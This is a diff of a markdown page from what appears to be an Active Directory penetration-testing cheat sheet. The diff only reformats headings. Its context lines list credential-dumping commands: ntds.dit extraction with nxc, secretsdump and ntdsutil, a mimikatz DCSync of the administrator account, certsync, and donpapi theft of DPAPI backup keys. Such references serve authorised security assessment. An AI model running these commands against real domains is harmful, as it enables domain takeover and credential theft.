@@ -2,7 +2,8 @@
 title: "Domain Admin"
 description: "Domain Admin techniques and commands for Active Directory security assessment."
 ---
-## Dump ntds.dit >>> Lateral move || Crack hash
+# Domain Admin
+## Dump ntds.dit *Lateral move || Crack hash*{: .highlight}
 - `nxc smb <dcip> -u <user> -p <password> -d <domain> --ntds`
 - `secretsdump.py '<domain>/<user>:<pass>'@<ip>`
 - `ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q`
@@ -11,5 +12,5 @@ description: "Domain Admin techniques and commands for Active Directory security
 - `mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\administrator`
 - `certsync -u <user> -p '<password>' -d <domain> -dc-ip <dc_ip> -ns <name_server>`
 
-## Grab backup Keys >>> Credentials
+## Grab backup Keys *Credentials*{: .highlight}
 - `donpapi collect - H ':<hash>' <domain>/<user>@<ip_range> -t ALL --fetch-pvk`
